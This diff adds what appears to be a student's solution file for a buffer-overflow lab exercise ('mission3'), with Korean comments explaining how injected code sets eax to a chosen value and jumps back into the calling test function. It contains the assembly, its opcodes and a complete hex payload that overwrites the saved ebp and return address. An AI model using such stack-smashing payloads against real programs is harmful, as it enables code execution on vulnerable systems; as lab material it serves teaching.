@@ -1,0 +1,35 @@
+/*
+
+mission3는 getbuf가 test 함수로 리턴되게 하되, return 값을 내가 원하는 값으로
+바꿔야합니다.  mission2의 코드를 그대로 재활용하고, 레지스터 eax의 값을 조작한
+뒤, getbuf에서 test의 반환값을 받는 부분으로 PC를 옮겨버리면 해결될것으로
+보입니다.
+
+&jump 목적지  0x08048dbe    be 8d 04 08
+
+이를 수행하는 어셈블리코드와, 그 opcode는 아래와 같습니다. `jmp edx` 명령어는
+64비트 아키텍처에선 허용되지 않으므로 `as --32 asm` 명령어로 컴파일해야 합니다.
+
+    .intel_syntax noprefix;
+    mov eax, 0x70fe5747
+    mov edx, 0x08048dbe
+    jmp edx
+
+    b8 47 57 fe 70
+    ba be 8d 04 08
+    ff e2
+
+*/
+
+b8 47 57 fe 70
+ba be 8d 04 08
+ff e2
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+10 2f 68 55 /* saved ebp */
+b8 2e 68 55 /* return addr */
